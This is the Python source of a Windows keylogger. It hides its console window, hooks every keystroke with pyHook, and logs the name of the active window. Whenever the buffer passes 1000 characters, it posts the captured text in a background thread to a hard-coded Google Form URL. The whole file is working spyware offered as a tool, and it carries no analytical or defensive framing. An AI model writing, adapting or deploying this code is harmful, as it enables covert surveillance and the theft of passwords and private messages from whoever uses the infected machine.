import os, sys, threading
import urllib,urllib2
from datetime import datetime
#sys.path.append("

try:
    import pythoncom, pyHook
except:
    exit(0)


	
DATE = todays_date = datetime.now().strftime('%Y-%b-%d')
WINDOW_NAME = ""

#-- SETUP
def main():
	hide()
	return True

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

	
	
	
#-- EVENT
CACHE_DATA = ""
MAXIMIZE_DATA_LENGTH = 1000
def OnKeyboardEvent(event):
	global WINDOW_NAME
	global CACHE_DATA
	
	if(WINDOW_NAME != event.WindowName):
		CACHE_DATA += ("\n-----WindowName: " + event.WindowName + "\n")
		WINDOW_NAME = event.WindowName
	
	if event.Ascii==13:
		CACHE_DATA += "\n<ENTER>\n"
	elif event.Ascii==8:
		keys = ''
	elif event.Ascii==9:
		CACHE_DATA += "\n<TAB>\n"
	else:
		CACHE_DATA += chr(event.Ascii)
	
	if len(CACHE_DATA) > MAXIMIZE_DATA_LENGTH:
		sendingData(CACHE_DATA)
		CACHE_DATA = ""
	
	return True

def sendingData(sendingText):
	thread = urlFetchThread(sendingText)
	thread.start()
		
class urlFetchThread(threading.Thread):
	def __init__(self, sendData):
		threading.Thread.__init__(self)
		self.sendData = sendData
		
	def run(self):
		url="https://docs.google.com/forms/d/e/1FAIpQLScwcJ5RQDZwwKFM_FwEe-X0gva0epK_NLxLj54PBzY0vvhOyQ/formResponse" #Specify Google Form URL here
		klog={'entry.738513555':self.sendData} #Specify the Field Name here
		
		dataenc=urllib.urlencode(klog)
		req=urllib2.Request(url,dataenc)
		urllib2.urlopen(req)
		
if __name__ == '__main__':
    main()
		
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
